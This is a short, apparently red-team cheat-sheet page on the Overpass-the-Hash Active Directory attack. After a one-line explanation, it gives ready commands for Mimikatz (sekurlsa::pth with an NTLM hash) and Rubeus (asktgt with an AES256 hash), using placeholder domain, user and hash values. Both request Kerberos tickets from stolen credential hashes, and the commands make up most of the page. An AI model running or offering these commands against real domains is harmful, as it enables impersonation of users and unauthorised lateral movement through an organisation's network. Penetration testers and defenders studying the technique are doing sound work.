# Overpass The Hash

## <mark style="color:yellow;">About</mark>

When <mark style="color:green;">**Pass-The-Hash**</mark> is mostly used to bypass regular login, then <mark style="color:green;">**Overpass-The-Hash**</mark> is using hash for requesting **TGT** from **KDC**.

## <mark style="color:yellow;">Mimikatz</mark>

```powershell
sekurlsa::pth /domain:amogus.kek /user:carni7 /ntlm:1293uo1uwfoi1hw081
```

## <mark style="color:yellow;">Rubeus</mark>

Here we use <mark style="color:red;">**asktgt**</mark> module to request a **TGT** using hash and **KDC**.

```powershell
Rubeus.exe asktgt /domain:amogus.kek /user:carni7 /aes256:1293uo1uwfoi1hw081 /nowrap
```
